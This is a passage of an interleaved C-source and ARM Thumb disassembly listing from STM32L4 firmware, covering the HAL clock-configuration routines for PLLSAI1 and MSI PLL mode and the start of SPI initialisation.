    if(PeriphClkInit->AdcClockSelection == RCC_ADCCLKSOURCE_PLLSAI1)
 8004806:	687b      	ldr	r3, [r7, #4]
 8004808:	6c9b      	ldr	r3, [r3, #72]	; 0x48
 800480a:	f1b3 5f80 	cmp.w	r3, #268435456	; 0x10000000
 800480e:	d10c      	bne.n	800482a <HAL_RCCEx_PeriphCLKConfig+0x3ba>
    {
      /* PLLSAI1 input clock, parameters M, N & R configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_R_UPDATE);
 8004810:	687b      	ldr	r3, [r7, #4]
 8004812:	3304      	adds	r3, #4
 8004814:	2102      	movs	r1, #2
 8004816:	4618      	mov	r0, r3
 8004818:	f000 f830 	bl	800487c <RCCEx_PLLSAI1_Config>
 800481c:	4603      	mov	r3, r0
 800481e:	74fb      	strb	r3, [r7, #19]

      if(ret != HAL_OK)
 8004820:	7cfb      	ldrb	r3, [r7, #19]
 8004822:	2b00      	cmp	r3, #0
 8004824:	d001      	beq.n	800482a <HAL_RCCEx_PeriphCLKConfig+0x3ba>
      {
        /* set overall return value */
        status = ret;
 8004826:	7cfb      	ldrb	r3, [r7, #19]
 8004828:	74bb      	strb	r3, [r7, #18]
#endif /* !STM32L412xx && !STM32L422xx */

#if defined(SWPMI1)

  /*-------------------------- SWPMI1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_SWPMI1) == RCC_PERIPHCLK_SWPMI1)
 800482a:	687b      	ldr	r3, [r7, #4]
 800482c:	681b      	ldr	r3, [r3, #0]
 800482e:	f403 4300 	and.w	r3, r3, #32768	; 0x8000
 8004832:	2b00      	cmp	r3, #0
 8004834:	d00a      	beq.n	800484c <HAL_RCCEx_PeriphCLKConfig+0x3dc>
  {
    /* Check the parameters */
    assert_param(IS_RCC_SWPMI1CLKSOURCE(PeriphClkInit->Swpmi1ClockSelection));

    /* Configure the SWPMI1 clock source */
    __HAL_RCC_SWPMI1_CONFIG(PeriphClkInit->Swpmi1ClockSelection);
 8004836:	4b08      	ldr	r3, [pc, #32]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004838:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800483c:	f023 4280 	bic.w	r2, r3, #1073741824	; 0x40000000
 8004840:	687b      	ldr	r3, [r7, #4]
 8004842:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8004844:	4904      	ldr	r1, [pc, #16]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004846:	4313      	orrs	r3, r2
 8004848:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
    }
  }

#endif /* OCTOSPI1 || OCTOSPI2 */

  return status;
 800484c:	7cbb      	ldrb	r3, [r7, #18]
}
 800484e:	4618      	mov	r0, r3
 8004850:	3718      	adds	r7, #24
 8004852:	46bd      	mov	sp, r7
 8004854:	bd80      	pop	{r7, pc}
 8004856:	bf00      	nop
 8004858:	40021000 	.word	0x40021000

0800485c <HAL_RCCEx_EnableMSIPLLMode>:
  * @note   Prior to enable the PLL-mode of the MSI for automatic hardware
  *         calibration LSE oscillator is to be enabled with HAL_RCC_OscConfig().
  * @retval None
  */
void HAL_RCCEx_EnableMSIPLLMode(void)
{
 800485c:	b480      	push	{r7}
 800485e:	af00      	add	r7, sp, #0
  SET_BIT(RCC->CR, RCC_CR_MSIPLLEN) ;
 8004860:	4b05      	ldr	r3, [pc, #20]	; (8004878 <HAL_RCCEx_EnableMSIPLLMode+0x1c>)
 8004862:	681b      	ldr	r3, [r3, #0]
 8004864:	4a04      	ldr	r2, [pc, #16]	; (8004878 <HAL_RCCEx_EnableMSIPLLMode+0x1c>)
 8004866:	f043 0304 	orr.w	r3, r3, #4
 800486a:	6013      	str	r3, [r2, #0]
}
 800486c:	bf00      	nop
 800486e:	46bd      	mov	sp, r7
 8004870:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004874:	4770      	bx	lr
 8004876:	bf00      	nop
 8004878:	40021000 	.word	0x40021000

0800487c <RCCEx_PLLSAI1_Config>:
  * @note   PLLSAI1 is temporary disable to apply new parameters
  *
  * @retval HAL status
  */
static HAL_StatusTypeDef RCCEx_PLLSAI1_Config(RCC_PLLSAI1InitTypeDef *PllSai1, uint32_t Divider)
{
 800487c:	b580      	push	{r7, lr}
 800487e:	b084      	sub	sp, #16
 8004880:	af00      	add	r7, sp, #0
 8004882:	6078      	str	r0, [r7, #4]
 8004884:	6039      	str	r1, [r7, #0]
  uint32_t tickstart;
  HAL_StatusTypeDef status = HAL_OK;
 8004886:	2300      	movs	r3, #0
 8004888:	73fb      	strb	r3, [r7, #15]
  assert_param(IS_RCC_PLLSAI1M_VALUE(PllSai1->PLLSAI1M));
  assert_param(IS_RCC_PLLSAI1N_VALUE(PllSai1->PLLSAI1N));
  assert_param(IS_RCC_PLLSAI1CLOCKOUT_VALUE(PllSai1->PLLSAI1ClockOut));

  /* Check that PLLSAI1 clock source and divider M can be applied */
  if(__HAL_RCC_GET_PLL_OSCSOURCE() != RCC_PLLSOURCE_NONE)
 800488a:	4b74      	ldr	r3, [pc, #464]	; (8004a5c <RCCEx_PLLSAI1_Config+0x1e0>)
 800488c:	68db      	ldr	r3, [r3, #12]
 800488e:	f003 0303 	and.w	r3, r3, #3
 8004892:	2b00      	cmp	r3, #0
 8004894:	d018      	beq.n	80048c8 <RCCEx_PLLSAI1_Config+0x4c>
  {
    /* PLL clock source and divider M already set, check that no request for change  */
    if((__HAL_RCC_GET_PLL_OSCSOURCE() != PllSai1->PLLSAI1Source)
 8004896:	4b71      	ldr	r3, [pc, #452]	; (8004a5c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004898:	68db      	ldr	r3, [r3, #12]
 800489a:	f003 0203 	and.w	r2, r3, #3
 800489e:	687b      	ldr	r3, [r7, #4]
 80048a0:	681b      	ldr	r3, [r3, #0]
 80048a2:	429a      	cmp	r2, r3
 80048a4:	d10d      	bne.n	80048c2 <RCCEx_PLLSAI1_Config+0x46>
       ||
       (PllSai1->PLLSAI1Source == RCC_PLLSOURCE_NONE)
 80048a6:	687b      	ldr	r3, [r7, #4]
 80048a8:	681b      	ldr	r3, [r3, #0]
       ||
 80048aa:	2b00      	cmp	r3, #0
 80048ac:	d009      	beq.n	80048c2 <RCCEx_PLLSAI1_Config+0x46>
#if !defined(RCC_PLLSAI1M_DIV_1_16_SUPPORT)
       ||
       (((READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLM) >> RCC_PLLCFGR_PLLM_Pos) + 1U) != PllSai1->PLLSAI1M)
 80048ae:	4b6b      	ldr	r3, [pc, #428]	; (8004a5c <RCCEx_PLLSAI1_Config+0x1e0>)
 80048b0:	68db      	ldr	r3, [r3, #12]
 80048b2:	091b      	lsrs	r3, r3, #4
 80048b4:	f003 0307 	and.w	r3, r3, #7
 80048b8:	1c5a      	adds	r2, r3, #1
 80048ba:	687b      	ldr	r3, [r7, #4]
 80048bc:	685b      	ldr	r3, [r3, #4]
       ||
 80048be:	429a      	cmp	r2, r3
 80048c0:	d047      	beq.n	8004952 <RCCEx_PLLSAI1_Config+0xd6>
#endif
      )
    {
      status = HAL_ERROR;
 80048c2:	2301      	movs	r3, #1
 80048c4:	73fb      	strb	r3, [r7, #15]
 80048c6:	e044      	b.n	8004952 <RCCEx_PLLSAI1_Config+0xd6>
    }
  }
  else
  {
    /* Check PLLSAI1 clock source availability */
    switch(PllSai1->PLLSAI1Source)
 80048c8:	687b      	ldr	r3, [r7, #4]
 80048ca:	681b      	ldr	r3, [r3, #0]
 80048cc:	2b03      	cmp	r3, #3
 80048ce:	d018      	beq.n	8004902 <RCCEx_PLLSAI1_Config+0x86>
 80048d0:	2b03      	cmp	r3, #3
 80048d2:	d825      	bhi.n	8004920 <RCCEx_PLLSAI1_Config+0xa4>
 80048d4:	2b01      	cmp	r3, #1
 80048d6:	d002      	beq.n	80048de <RCCEx_PLLSAI1_Config+0x62>
 80048d8:	2b02      	cmp	r3, #2
 80048da:	d009      	beq.n	80048f0 <RCCEx_PLLSAI1_Config+0x74>
 80048dc:	e020      	b.n	8004920 <RCCEx_PLLSAI1_Config+0xa4>
    {
    case RCC_PLLSOURCE_MSI:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_MSIRDY))
 80048de:	4b5f      	ldr	r3, [pc, #380]	; (8004a5c <RCCEx_PLLSAI1_Config+0x1e0>)
 80048e0:	681b      	ldr	r3, [r3, #0]
 80048e2:	f003 0302 	and.w	r3, r3, #2
 80048e6:	2b00      	cmp	r3, #0
 80048e8:	d11d      	bne.n	8004926 <RCCEx_PLLSAI1_Config+0xaa>
      {
        status = HAL_ERROR;
 80048ea:	2301      	movs	r3, #1
 80048ec:	73fb      	strb	r3, [r7, #15]
      }
      break;
 80048ee:	e01a      	b.n	8004926 <RCCEx_PLLSAI1_Config+0xaa>
    case RCC_PLLSOURCE_HSI:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSIRDY))
 80048f0:	4b5a      	ldr	r3, [pc, #360]	; (8004a5c <RCCEx_PLLSAI1_Config+0x1e0>)
 80048f2:	681b      	ldr	r3, [r3, #0]
 80048f4:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 80048f8:	2b00      	cmp	r3, #0
 80048fa:	d116      	bne.n	800492a <RCCEx_PLLSAI1_Config+0xae>
      {
        status = HAL_ERROR;
 80048fc:	2301      	movs	r3, #1
 80048fe:	73fb      	strb	r3, [r7, #15]
      }
      break;
 8004900:	e013      	b.n	800492a <RCCEx_PLLSAI1_Config+0xae>
    case RCC_PLLSOURCE_HSE:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSERDY))
 8004902:	4b56      	ldr	r3, [pc, #344]	; (8004a5c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004904:	681b      	ldr	r3, [r3, #0]
 8004906:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 800490a:	2b00      	cmp	r3, #0
 800490c:	d10f      	bne.n	800492e <RCCEx_PLLSAI1_Config+0xb2>
      {
        if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSEBYP))
 800490e:	4b53      	ldr	r3, [pc, #332]	; (8004a5c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004910:	681b      	ldr	r3, [r3, #0]
 8004912:	f403 2380 	and.w	r3, r3, #262144	; 0x40000
 8004916:	2b00      	cmp	r3, #0
 8004918:	d109      	bne.n	800492e <RCCEx_PLLSAI1_Config+0xb2>
        {
          status = HAL_ERROR;
 800491a:	2301      	movs	r3, #1
 800491c:	73fb      	strb	r3, [r7, #15]
        }
      }
      break;
 800491e:	e006      	b.n	800492e <RCCEx_PLLSAI1_Config+0xb2>
    default:
      status = HAL_ERROR;
 8004920:	2301      	movs	r3, #1
 8004922:	73fb      	strb	r3, [r7, #15]
      break;
 8004924:	e004      	b.n	8004930 <RCCEx_PLLSAI1_Config+0xb4>
      break;
 8004926:	bf00      	nop
 8004928:	e002      	b.n	8004930 <RCCEx_PLLSAI1_Config+0xb4>
      break;
 800492a:	bf00      	nop
 800492c:	e000      	b.n	8004930 <RCCEx_PLLSAI1_Config+0xb4>
      break;
 800492e:	bf00      	nop
    }

    if(status == HAL_OK)
 8004930:	7bfb      	ldrb	r3, [r7, #15]
 8004932:	2b00      	cmp	r3, #0
 8004934:	d10d      	bne.n	8004952 <RCCEx_PLLSAI1_Config+0xd6>
#if defined(RCC_PLLSAI1M_DIV_1_16_SUPPORT)
      /* Set PLLSAI1 clock source */
      MODIFY_REG(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC, PllSai1->PLLSAI1Source);
#else
      /* Set PLLSAI1 clock source and divider M */
      MODIFY_REG(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC | RCC_PLLCFGR_PLLM, PllSai1->PLLSAI1Source | (PllSai1->PLLSAI1M - 1U) << RCC_PLLCFGR_PLLM_Pos);
 8004936:	4b49      	ldr	r3, [pc, #292]	; (8004a5c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004938:	68db      	ldr	r3, [r3, #12]
 800493a:	f023 0273 	bic.w	r2, r3, #115	; 0x73
 800493e:	687b      	ldr	r3, [r7, #4]
 8004940:	6819      	ldr	r1, [r3, #0]
 8004942:	687b      	ldr	r3, [r7, #4]
 8004944:	685b      	ldr	r3, [r3, #4]
 8004946:	3b01      	subs	r3, #1
 8004948:	011b      	lsls	r3, r3, #4
 800494a:	430b      	orrs	r3, r1
 800494c:	4943      	ldr	r1, [pc, #268]	; (8004a5c <RCCEx_PLLSAI1_Config+0x1e0>)
 800494e:	4313      	orrs	r3, r2
 8004950:	60cb      	str	r3, [r1, #12]
#endif
    }
  }

  if(status == HAL_OK)
 8004952:	7bfb      	ldrb	r3, [r7, #15]
 8004954:	2b00      	cmp	r3, #0
 8004956:	d17c      	bne.n	8004a52 <RCCEx_PLLSAI1_Config+0x1d6>
  {
    /* Disable the PLLSAI1 */
    __HAL_RCC_PLLSAI1_DISABLE();
 8004958:	4b40      	ldr	r3, [pc, #256]	; (8004a5c <RCCEx_PLLSAI1_Config+0x1e0>)
 800495a:	681b      	ldr	r3, [r3, #0]
 800495c:	4a3f      	ldr	r2, [pc, #252]	; (8004a5c <RCCEx_PLLSAI1_Config+0x1e0>)
 800495e:	f023 6380 	bic.w	r3, r3, #67108864	; 0x4000000
 8004962:	6013      	str	r3, [r2, #0]

    /* Get Start Tick*/
    tickstart = HAL_GetTick();
 8004964:	f7fc fbc8 	bl	80010f8 <HAL_GetTick>
 8004968:	60b8      	str	r0, [r7, #8]

    /* Wait till PLLSAI1 is ready to be updated */
    while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) != 0U)
 800496a:	e009      	b.n	8004980 <RCCEx_PLLSAI1_Config+0x104>
    {
      if((HAL_GetTick() - tickstart) > PLLSAI1_TIMEOUT_VALUE)
 800496c:	f7fc fbc4 	bl	80010f8 <HAL_GetTick>
 8004970:	4602      	mov	r2, r0
 8004972:	68bb      	ldr	r3, [r7, #8]
 8004974:	1ad3      	subs	r3, r2, r3
 8004976:	2b02      	cmp	r3, #2
 8004978:	d902      	bls.n	8004980 <RCCEx_PLLSAI1_Config+0x104>
      {
        status = HAL_TIMEOUT;
 800497a:	2303      	movs	r3, #3
 800497c:	73fb      	strb	r3, [r7, #15]
        break;
 800497e:	e005      	b.n	800498c <RCCEx_PLLSAI1_Config+0x110>
    while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) != 0U)
 8004980:	4b36      	ldr	r3, [pc, #216]	; (8004a5c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004982:	681b      	ldr	r3, [r3, #0]
 8004984:	f003 6300 	and.w	r3, r3, #134217728	; 0x8000000
 8004988:	2b00      	cmp	r3, #0
 800498a:	d1ef      	bne.n	800496c <RCCEx_PLLSAI1_Config+0xf0>
      }
    }

    if(status == HAL_OK)
 800498c:	7bfb      	ldrb	r3, [r7, #15]
 800498e:	2b00      	cmp	r3, #0
 8004990:	d15f      	bne.n	8004a52 <RCCEx_PLLSAI1_Config+0x1d6>
    {
      if(Divider == DIVIDER_P_UPDATE)
 8004992:	683b      	ldr	r3, [r7, #0]
 8004994:	2b00      	cmp	r3, #0
 8004996:	d110      	bne.n	80049ba <RCCEx_PLLSAI1_Config+0x13e>
#endif /* RCC_PLLSAI1P_DIV_2_31_SUPPORT */

#else
        /* Configure the PLLSAI1 Division factor P and Multiplication factor N*/
#if defined(RCC_PLLSAI1P_DIV_2_31_SUPPORT)
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004998:	4b30      	ldr	r3, [pc, #192]	; (8004a5c <RCCEx_PLLSAI1_Config+0x1e0>)
 800499a:	691b      	ldr	r3, [r3, #16]
 800499c:	f023 4378 	bic.w	r3, r3, #4160749568	; 0xf8000000
 80049a0:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 80049a4:	687a      	ldr	r2, [r7, #4]
 80049a6:	6892      	ldr	r2, [r2, #8]
 80049a8:	0211      	lsls	r1, r2, #8
 80049aa:	687a      	ldr	r2, [r7, #4]
 80049ac:	68d2      	ldr	r2, [r2, #12]
 80049ae:	06d2      	lsls	r2, r2, #27
 80049b0:	430a      	orrs	r2, r1
 80049b2:	492a      	ldr	r1, [pc, #168]	; (8004a5c <RCCEx_PLLSAI1_Config+0x1e0>)
 80049b4:	4313      	orrs	r3, r2
 80049b6:	610b      	str	r3, [r1, #16]
 80049b8:	e027      	b.n	8004a0a <RCCEx_PLLSAI1_Config+0x18e>
                   ((PllSai1->PLLSAI1P >> 4U) << RCC_PLLSAI1CFGR_PLLSAI1P_Pos));
#endif /* RCC_PLLSAI1P_DIV_2_31_SUPPORT */

#endif /* RCC_PLLSAI1M_DIV_1_16_SUPPORT */
      }
      else if(Divider == DIVIDER_Q_UPDATE)
 80049ba:	683b      	ldr	r3, [r7, #0]
 80049bc:	2b01      	cmp	r3, #1
 80049be:	d112      	bne.n	80049e6 <RCCEx_PLLSAI1_Config+0x16a>
                   (PllSai1->PLLSAI1N << RCC_PLLSAI1CFGR_PLLSAI1N_Pos) |
                   (((PllSai1->PLLSAI1Q >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1Q_Pos) |
                   ((PllSai1->PLLSAI1M - 1U) << RCC_PLLSAI1CFGR_PLLSAI1M_Pos));
#else
        /* Configure the PLLSAI1 Division factor Q and Multiplication factor N*/
        MODIFY_REG(RCC->PLLSAI1CFGR,
 80049c0:	4b26      	ldr	r3, [pc, #152]	; (8004a5c <RCCEx_PLLSAI1_Config+0x1e0>)
 80049c2:	691b      	ldr	r3, [r3, #16]
 80049c4:	f423 03c0 	bic.w	r3, r3, #6291456	; 0x600000
 80049c8:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 80049cc:	687a      	ldr	r2, [r7, #4]
 80049ce:	6892      	ldr	r2, [r2, #8]
 80049d0:	0211      	lsls	r1, r2, #8
 80049d2:	687a      	ldr	r2, [r7, #4]
 80049d4:	6912      	ldr	r2, [r2, #16]
 80049d6:	0852      	lsrs	r2, r2, #1
 80049d8:	3a01      	subs	r2, #1
 80049da:	0552      	lsls	r2, r2, #21
 80049dc:	430a      	orrs	r2, r1
 80049de:	491f      	ldr	r1, [pc, #124]	; (8004a5c <RCCEx_PLLSAI1_Config+0x1e0>)
 80049e0:	4313      	orrs	r3, r2
 80049e2:	610b      	str	r3, [r1, #16]
 80049e4:	e011      	b.n	8004a0a <RCCEx_PLLSAI1_Config+0x18e>
                   (PllSai1->PLLSAI1N << RCC_PLLSAI1CFGR_PLLSAI1N_Pos) |
                   (((PllSai1->PLLSAI1R >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1R_Pos) |
                   ((PllSai1->PLLSAI1M - 1U) << RCC_PLLSAI1CFGR_PLLSAI1M_Pos));
#else
        /* Configure the PLLSAI1 Division factor R and Multiplication factor N*/
        MODIFY_REG(RCC->PLLSAI1CFGR,
 80049e6:	4b1d      	ldr	r3, [pc, #116]	; (8004a5c <RCCEx_PLLSAI1_Config+0x1e0>)
 80049e8:	691b      	ldr	r3, [r3, #16]
 80049ea:	f023 63c0 	bic.w	r3, r3, #100663296	; 0x6000000
 80049ee:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 80049f2:	687a      	ldr	r2, [r7, #4]
 80049f4:	6892      	ldr	r2, [r2, #8]
 80049f6:	0211      	lsls	r1, r2, #8
 80049f8:	687a      	ldr	r2, [r7, #4]
 80049fa:	6952      	ldr	r2, [r2, #20]
 80049fc:	0852      	lsrs	r2, r2, #1
 80049fe:	3a01      	subs	r2, #1
 8004a00:	0652      	lsls	r2, r2, #25
 8004a02:	430a      	orrs	r2, r1
 8004a04:	4915      	ldr	r1, [pc, #84]	; (8004a5c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a06:	4313      	orrs	r3, r2
 8004a08:	610b      	str	r3, [r1, #16]
                   (((PllSai1->PLLSAI1R >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1R_Pos));
#endif /* RCC_PLLSAI1M_DIV_1_16_SUPPORT */
      }

      /* Enable the PLLSAI1 again by setting PLLSAI1ON to 1*/
      __HAL_RCC_PLLSAI1_ENABLE();
 8004a0a:	4b14      	ldr	r3, [pc, #80]	; (8004a5c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a0c:	681b      	ldr	r3, [r3, #0]
 8004a0e:	4a13      	ldr	r2, [pc, #76]	; (8004a5c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a10:	f043 6380 	orr.w	r3, r3, #67108864	; 0x4000000
 8004a14:	6013      	str	r3, [r2, #0]

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8004a16:	f7fc fb6f 	bl	80010f8 <HAL_GetTick>
 8004a1a:	60b8      	str	r0, [r7, #8]

      /* Wait till PLLSAI1 is ready */
      while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) == 0U)
 8004a1c:	e009      	b.n	8004a32 <RCCEx_PLLSAI1_Config+0x1b6>
      {
        if((HAL_GetTick() - tickstart) > PLLSAI1_TIMEOUT_VALUE)
 8004a1e:	f7fc fb6b 	bl	80010f8 <HAL_GetTick>
 8004a22:	4602      	mov	r2, r0
 8004a24:	68bb      	ldr	r3, [r7, #8]
 8004a26:	1ad3      	subs	r3, r2, r3
 8004a28:	2b02      	cmp	r3, #2
 8004a2a:	d902      	bls.n	8004a32 <RCCEx_PLLSAI1_Config+0x1b6>
        {
          status = HAL_TIMEOUT;
 8004a2c:	2303      	movs	r3, #3
 8004a2e:	73fb      	strb	r3, [r7, #15]
          break;
 8004a30:	e005      	b.n	8004a3e <RCCEx_PLLSAI1_Config+0x1c2>
      while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) == 0U)
 8004a32:	4b0a      	ldr	r3, [pc, #40]	; (8004a5c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a34:	681b      	ldr	r3, [r3, #0]
 8004a36:	f003 6300 	and.w	r3, r3, #134217728	; 0x8000000
 8004a3a:	2b00      	cmp	r3, #0
 8004a3c:	d0ef      	beq.n	8004a1e <RCCEx_PLLSAI1_Config+0x1a2>
        }
      }

      if(status == HAL_OK)
 8004a3e:	7bfb      	ldrb	r3, [r7, #15]
 8004a40:	2b00      	cmp	r3, #0
 8004a42:	d106      	bne.n	8004a52 <RCCEx_PLLSAI1_Config+0x1d6>
      {
        /* Configure the PLLSAI1 Clock output(s) */
        __HAL_RCC_PLLSAI1CLKOUT_ENABLE(PllSai1->PLLSAI1ClockOut);
 8004a44:	4b05      	ldr	r3, [pc, #20]	; (8004a5c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a46:	691a      	ldr	r2, [r3, #16]
 8004a48:	687b      	ldr	r3, [r7, #4]
 8004a4a:	699b      	ldr	r3, [r3, #24]
 8004a4c:	4903      	ldr	r1, [pc, #12]	; (8004a5c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a4e:	4313      	orrs	r3, r2
 8004a50:	610b      	str	r3, [r1, #16]
      }
    }
  }

  return status;
 8004a52:	7bfb      	ldrb	r3, [r7, #15]
}
 8004a54:	4618      	mov	r0, r3
 8004a56:	3710      	adds	r7, #16
 8004a58:	46bd      	mov	sp, r7
 8004a5a:	bd80      	pop	{r7, pc}
 8004a5c:	40021000 	.word	0x40021000

08004a60 <HAL_SPI_Init>:
  * @param  hspi pointer to a SPI_HandleTypeDef structure that contains
  *               the configuration information for SPI module.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_SPI_Init(SPI_HandleTypeDef *hspi)
{
 8004a60:	b580      	push	{r7, lr}
 8004a62:	b084      	sub	sp, #16
 8004a64:	af00      	add	r7, sp, #0
 8004a66:	6078      	str	r0, [r7, #4]
  uint32_t frxth;

  /* Check the SPI handle allocation */
  if (hspi == NULL)
 8004a68:	687b      	ldr	r3, [r7, #4]
 8004a6a:	2b00      	cmp	r3, #0
 8004a6c:	d101      	bne.n	8004a72 <HAL_SPI_Init+0x12>
  {
    return HAL_ERROR;
 8004a6e:	2301      	movs	r3, #1
 8004a70:	e095      	b.n	8004b9e <HAL_SPI_Init+0x13e>
  assert_param(IS_SPI_NSS(hspi->Init.NSS));
  assert_param(IS_SPI_NSSP(hspi->Init.NSSPMode));
  assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));
  assert_param(IS_SPI_FIRST_BIT(hspi->Init.FirstBit));
  assert_param(IS_SPI_TIMODE(hspi->Init.TIMode));
  if (hspi->Init.TIMode == SPI_TIMODE_DISABLE)
 8004a72:	687b      	ldr	r3, [r7, #4]
 8004a74:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004a76:	2b00      	cmp	r3, #0
 8004a78:	d108      	bne.n	8004a8c <HAL_SPI_Init+0x2c>
  {
    assert_param(IS_SPI_CPOL(hspi->Init.CLKPolarity));
    assert_param(IS_SPI_CPHA(hspi->Init.CLKPhase));

    if (hspi->Init.Mode == SPI_MODE_MASTER)
 8004a7a:	687b      	ldr	r3, [r7, #4]
 8004a7c:	685b      	ldr	r3, [r3, #4]
 8004a7e:	f5b3 7f82 	cmp.w	r3, #260	; 0x104
 8004a82:	d009      	beq.n	8004a98 <HAL_SPI_Init+0x38>
      assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));
    }
    else
    {
      /* Baudrate prescaler not use in Motoraola Slave mode. force to default value */
      hspi->Init.BaudRatePrescaler = SPI_BAUDRATEPRESCALER_2;
 8004a84:	687b      	ldr	r3, [r7, #4]
 8004a86:	2200      	movs	r2, #0
 8004a88:	61da      	str	r2, [r3, #28]
 8004a8a:	e005      	b.n	8004a98 <HAL_SPI_Init+0x38>
  else
  {
    assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));

    /* Force polarity and phase to TI protocaol requirements */
    hspi->Init.CLKPolarity = SPI_POLARITY_LOW;
 8004a8c:	687b      	ldr	r3, [r7, #4]
 8004a8e:	2200      	movs	r2, #0
 8004a90:	611a      	str	r2, [r3, #16]
    hspi->Init.CLKPhase    = SPI_PHASE_1EDGE;
 8004a92:	687b      	ldr	r3, [r7, #4]
 8004a94:	2200      	movs	r2, #0
 8004a96:	615a      	str	r2, [r3, #20]
  {
    assert_param(IS_SPI_CRC_POLYNOMIAL(hspi->Init.CRCPolynomial));
    assert_param(IS_SPI_CRC_LENGTH(hspi->Init.CRCLength));
  }
#else
  hspi->Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8004a98:	687b      	ldr	r3, [r7, #4]
 8004a9a:	2200      	movs	r2, #0
 8004a9c:	629a      	str	r2, [r3, #40]	; 0x28
#endif /* USE_SPI_CRC */

  if (hspi->State == HAL_SPI_STATE_RESET)
 8004a9e:	687b      	ldr	r3, [r7, #4]
 8004aa0:	f893 305d 	ldrb.w	r3, [r3, #93]	; 0x5d
 8004aa4:	b2db      	uxtb	r3, r3
 8004aa6:	2b00      	cmp	r3, #0
 8004aa8:	d106      	bne.n	8004ab8 <HAL_SPI_Init+0x58>
  {
    /* Allocate lock resource and initialize it */
    hspi->Lock = HAL_UNLOCKED;
 8004aaa:	687b      	ldr	r3, [r7, #4]
 8004aac:	2200      	movs	r2, #0
 8004aae:	f883 205c 	strb.w	r2, [r3, #92]	; 0x5c

    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    hspi->MspInitCallback(hspi);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    HAL_SPI_MspInit(hspi);
 8004ab2:	6878      	ldr	r0, [r7, #4]
 8004ab4:	f7fc f8cc 	bl	8000c50 <HAL_SPI_MspInit>
#endif /* USE_HAL_SPI_REGISTER_CALLBACKS */
  }

  hspi->State = HAL_SPI_STATE_BUSY;
 8004ab8:	687b      	ldr	r3, [r7, #4]
 8004aba:	2202      	movs	r2, #2
 8004abc:	f883 205d 	strb.w	r2, [r3, #93]	; 0x5d

  /* Disable the selected SPI peripheral */
  __HAL_SPI_DISABLE(hspi);
 8004ac0:	687b      	ldr	r3, [r7, #4]
 8004ac2:	681b      	ldr	r3, [r3, #0]
 8004ac4:	681a      	ldr	r2, [r3, #0]
 8004ac6:	687b      	ldr	r3, [r7, #4]
 8004ac8:	681b      	ldr	r3, [r3, #0]
 8004aca:	f022 0240 	bic.w	r2, r2, #64	; 0x40
 8004ace:	601a      	str	r2, [r3, #0]

  /* Align by default the rs fifo threshold on the data size */
  if (hspi->Init.DataSize > SPI_DATASIZE_8BIT)
 8004ad0:	687b      	ldr	r3, [r7, #4]
 8004ad2:	68db      	ldr	r3, [r3, #12]
 8004ad4:	f5b3 6fe0 	cmp.w	r3, #1792	; 0x700
 8004ad8:	d902      	bls.n	8004ae0 <HAL_SPI_Init+0x80>
  {
    frxth = SPI_RXFIFO_THRESHOLD_HF;
 8004ada:	2300      	movs	r3, #0
 8004adc:	60fb      	str	r3, [r7, #12]
 8004ade:	e002      	b.n	8004ae6 <HAL_SPI_Init+0x86>
  }
  else
  {
    frxth = SPI_RXFIFO_THRESHOLD_QF;
 8004ae0:	f44f 5380 	mov.w	r3, #4096	; 0x1000
 8004ae4:	60fb      	str	r3, [r7, #12]
  }

  /* CRC calculation is valid only for 16Bit and 8 Bit */
  if ((hspi->Init.DataSize != SPI_DATASIZE_16BIT) && (hspi->Init.DataSize != SPI_DATASIZE_8BIT))
 8004ae6:	687b      	ldr	r3, [r7, #4]
 8004ae8:	68db      	ldr	r3, [r3, #12]
 8004aea:	f5b3 6f70 	cmp.w	r3, #3840	; 0xf00
